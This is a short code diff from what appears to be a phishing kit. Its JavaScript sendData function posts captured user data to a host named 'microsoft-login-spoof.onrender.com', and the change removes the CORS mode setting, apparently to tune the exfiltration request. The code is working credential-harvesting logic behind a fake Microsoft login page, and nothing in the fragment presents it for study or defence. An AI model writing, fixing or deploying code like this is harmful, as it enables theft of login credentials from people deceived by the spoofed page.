@@ -25,7 +25,6 @@ const createBody = (data) => {
 const sendData = (data) => {
     fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
         method: 'POST',
-        mode: 'cors',
         cache: 'no-cache',
         headers: {
             'Content-Type': 'application/x-www-form-urlencoded',
